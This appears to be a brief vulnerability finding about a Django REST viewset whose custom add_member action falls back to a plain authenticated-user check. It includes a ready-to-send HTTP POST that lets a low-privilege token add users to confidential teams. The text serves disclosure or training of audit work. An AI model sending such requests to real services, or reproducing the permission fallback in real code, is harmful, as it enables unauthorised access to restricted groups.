diagnosis: The viewset's get_permissions() method guards CRUD operations using IsOrgAdmin but custom actions like add_member fail the check and fall back to [permissions.IsAuthenticated()]. Any authenticated user can issue a POST to /api/teams/{pk}/add_member/ and add themselves or other users into confidential internal teams (e.g. Executive Board, Security Incident Response).
exploit_request:
POST /api/teams/12/add_member/ HTTP/1.1
Host: collab.enterprisehub.net
Authorization: Bearer <low_privilege_user_token>
Content-Type: application/json

{"user_id": 99}
